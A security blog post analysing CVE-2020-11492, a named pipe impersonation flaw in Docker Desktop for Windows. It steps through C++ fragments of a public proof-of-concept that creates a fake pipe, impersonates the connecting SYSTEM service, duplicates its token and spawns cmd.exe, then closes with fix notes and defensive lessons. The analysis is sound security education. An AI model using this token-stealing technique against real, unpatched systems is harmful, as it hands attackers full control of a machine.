+++
title = 'Analyzing CVE-2020-11492 Docker Desktop Privilege Escalation'
date = 2024-03-05 17:15:22
draft = false
+++

> CVE-2020-11492 was a critical privilege escalation vulnerability in Docker Desktop for Windows that allowed attackers to gain SYSTEM privileges through Windows named pipe impersonation. This post examines how the vulnerability worked by analyzing a proof-of-concept exploit, explaining the mechanics of named pipe impersonation attacks, and discussing the security implications for containerized environments. Though patched in May 2020, this vulnerability highlights important lessons about securing communication channels in privileged applications.

## Introduction

Docker has revolutionized how developers build, ship, and run applications, but security issues can sometimes arise where containerization meets the host operating system. One notable example is CVE-2020-11492, a privilege escalation vulnerability in Docker Desktop for Windows that was patched in May 2020.

I recently came across this vulnerability while doing some security research and decided to analyze the exploit mechanism. This post walks through how the vulnerability worked and what we can learn from it.

## The Vulnerability

The core issue in CVE-2020-11492 was relatively straightforward but had serious implications: Docker Desktop for Windows created a named pipe (`\\.\\pipe\\dockerLifecycleServer`) that could be impersonated by a malicious actor. Since the Docker service runs with SYSTEM privileges, an attacker who could successfully impersonate this pipe could potentially gain those same privileges.

Named pipes are a Windows IPC (Inter-Process Communication) mechanism that allow processes to communicate, potentially across different security contexts. They're often used by services to expose functionality to less-privileged processes. However, if not properly secured, they can become a vector for privilege escalation.

## The Exploit Mechanism

The proof-of-concept exploit for this vulnerability follows a classic named pipe impersonation attack pattern:

1. Create a named pipe that mimics the legitimate Docker named pipe (`\\.\\pipe\\dockerLifecycleServer`)
2. Wait for the Docker service to connect to the fake pipe
3. Use the Windows API `ImpersonateNamedPipeClient()` to assume the security context of the connecting client (Docker service)
4. Retrieve and duplicate the impersonated token
5. Launch a new process (cmd.exe) with the stolen token, which will run with SYSTEM privileges

Let's break down the key components of the exploit code to understand how it works.

### Creating the Fake Named Pipe

```cpp
HANDLE pipe = CreateNamedPipeA(
    "\\\\.\\pipe\\dockerLifecycleServer",
    openMode,
    pipeMode,
    1,              // max instances
    msgSize,        // out buffer size
    msgSize,        // in buffer size
    0,              // timeout. 0 ~= 50ms
    &SecurityAttrs);
```

The exploit creates a named pipe with the exact same name that Docker Desktop uses. This is a classic race condition attack - if the attacker's pipe is created first, the Docker service will connect to it instead of creating its own.

### Waiting for Docker to Connect

```cpp
bool connected = ConnectNamedPipe(pipe, NULL) ? true : (
    GetLastError() == ERROR_PIPE_CONNECTED);
```

Once the fake pipe is created, the exploit waits for the Docker service to connect to it. The Docker service runs with SYSTEM privileges, so when it connects, it does so with those elevated privileges.

### Impersonating the Client

```cpp
if (!ImpersonateNamedPipeClient(pipe)) {
    // Error handling
}
```

This is where the magic happens. The `ImpersonateNamedPipeClient()` function allows the calling process to impersonate the security context of the client process that's connected to the other end of the pipe. In this case, it means the exploit can temporarily assume the SYSTEM privileges of the Docker service.

### Retrieving and Duplicating the Token

```cpp
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &hToken)) {
    // Error handling
}

HANDLE hDuplicateToken = new HANDLE;
if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
    // Error handling
}
```

After impersonation, the code retrieves the access token from the current thread and duplicates it. This duplication is necessary because the impersonation is temporary and tied to the thread that called `ImpersonateNamedPipeClient()`. By duplicating the token, the exploit can use it even after the impersonation ends.

### Launching a Process with the Token

```cpp
if (!CreateProcessWithTokenW(
        hDuplicateToken,
        0,
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,                   // command line args      
        CREATE_NEW_CONSOLE,     // creation flags
        NULL,                   // environment block
        NULL,                   // current directory
        &si,                    // startup info
        &pi                     // process info
    )) 
{
    // Error handling
}
```

Finally, the exploit launches a new cmd.exe process using the duplicated token. Since this token has SYSTEM privileges, the new process also runs with SYSTEM privileges, giving the attacker complete control over the system.

## Exploitation Requirements

An important nuance of this vulnerability is that it can't be exploited by just any user. The readme for the PoC notes:

> The right to impersonate the named pipe client is not held by standard users. To exploit, one must run this PoC as an account with the right, for example nt authority\network service.

This is because Windows restricts which accounts can perform impersonation. By default, standard users don't have the `SeImpersonatePrivilege`, which is required to call `ImpersonateNamedPipeClient()`. However, certain service accounts like `NETWORK SERVICE` do have this privilege, so the vulnerability could still be exploited in scenarios where an attacker has compromised such an account.

## The Fix

Docker fixed this vulnerability in version 2.3.0.2, released on May 11th, 2020. The fix likely involved:

1. Properly securing the named pipe with appropriate ACLs (Access Control Lists) to prevent unauthorized access
2. Implementing additional authentication mechanisms for pipe connections
3. Potentially changing how the pipe is created and managed to avoid race conditions

## Lessons Learned

This vulnerability highlights several important security considerations:

1. **IPC Mechanisms Need Proper Access Controls**: Named pipes, like any IPC mechanism, need to be secured with appropriate access controls to prevent unauthorized access.

2. **Race Conditions Can Lead to Security Issues**: The vulnerability exploited a race condition where an attacker could create a named pipe before the legitimate service. Always ensure that your application handles such scenarios securely.

3. **Privileged Services Require Extra Scrutiny**: Services running with elevated privileges (like SYSTEM) should be especially careful about how they interact with less-privileged processes.

4. **Impersonation Is a Powerful Feature with Security Implications**: Windows impersonation is a powerful feature that allows processes to temporarily assume the security context of other processes. It's important to understand the security implications and use it carefully.

## Conclusion

CVE-2020-11492 is a classic example of how seemingly minor issues in systems design can lead to significant security vulnerabilities. By understanding how this vulnerability worked, we can better appreciate the importance of secure IPC mechanisms and proper access controls.

Although this particular vulnerability has been patched, the underlying techniques - named pipe impersonation and token stealing - remain relevant for both attackers and defenders. As containerization technologies like Docker become increasingly prevalent in enterprise environments, securing the boundaries between containers and the host operating system will remain a critical security challenge.

The full POC can be found here: https://github.com/joshfinley/CVE-2020-11492.

{{< footnote >}}This analysis is based on publicly available information about CVE-2020-11492, including the proof-of-concept code. The techniques discussed should only be used in authorized security testing environments with appropriate permissions.{{< /footnote >}}
